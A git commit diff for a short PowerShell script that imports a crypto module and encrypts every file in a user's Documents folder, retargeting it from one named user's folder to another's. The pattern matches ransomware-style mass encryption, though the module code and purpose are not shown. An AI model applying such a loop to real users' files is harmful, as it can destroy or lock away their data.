df9796881a6ba3c2984c1a65cbf0a0fa671d6ef9
muahmmedshahblis <nourhanmohamed43210@gmail.com>
2025-08-23 16:58:58 +0300

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,6 +1,6 @@
 Import-Module .\crypto.psm1
 
-$TargetDir = "C:\Users\alice\Documents"
+$TargetDir = "C:\Users\charles\Documents"
 
 Get-ChildItem -Path $TargetDir -File | ForEach-Object {
     Invoke-FileEncrypt -Path $_.FullName
